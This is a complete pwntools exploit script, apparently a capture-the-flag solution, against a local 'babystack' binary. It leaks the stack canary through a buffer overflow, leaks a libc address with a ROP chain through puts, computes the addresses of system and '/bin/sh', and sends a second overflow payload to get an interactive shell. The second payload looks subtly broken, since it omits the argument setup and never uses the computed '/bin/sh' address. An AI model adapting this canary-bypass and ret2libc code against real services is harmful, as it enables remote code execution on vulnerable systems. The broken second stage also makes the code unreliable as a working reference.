import pwn

pwn.context(arch='amd64', os='linux', log_level='debug')


p = pwn.process('./babystack')
e = pwn.ELF('./babystack')
libc = pwn.ELF('./libc-2.23.so')

#pwn.gdb.attach(p)

main_addr = pwn.p64(0x400908)
puts_plt = pwn.p64(e.plt['puts'])
puts_got = pwn.p64(e.got['puts'])
pop_rdi_addr = pwn.p64(0x400a93)

p.sendlineafter(b'>> ', b'1')
p.sendline(b'A' * 136)

#pwn.gdb.attach(p)

p.sendlineafter(b'>> ', b'2')
canary = b'\x00' + p.recv()[137:144]
#print(hex(pwn.u64(canary)))
p.sendline(b'1')

#pwn.gdb.attach(p)

payload = b'A' * 136 + canary + b'B' * 8 + pop_rdi_addr + puts_got + puts_plt + main_addr

print(payload)
#pwn.pause()
p.sendline(payload)

p.recv()
#pwn.gdb.attach(p)

p.sendline(b'3')
puts_addr = pwn.u64(p.recv(6).ljust(8, b'\x00'))
print(hex(puts_addr))

libc_base = puts_addr - libc.sym['puts']
system_addr = pwn.p64(libc_base + libc.sym['system'])
sh_addr = pwn.p64(libc_base + next(libc.search(b'/bin/sh')))

payload2 = b'A' * 136 + canary + b'B' * 8 + system_addr
p.sendline(b'1')
p.sendline(payload2)

p.sendlineafter(b'>> ', b'3')
p.interactive()
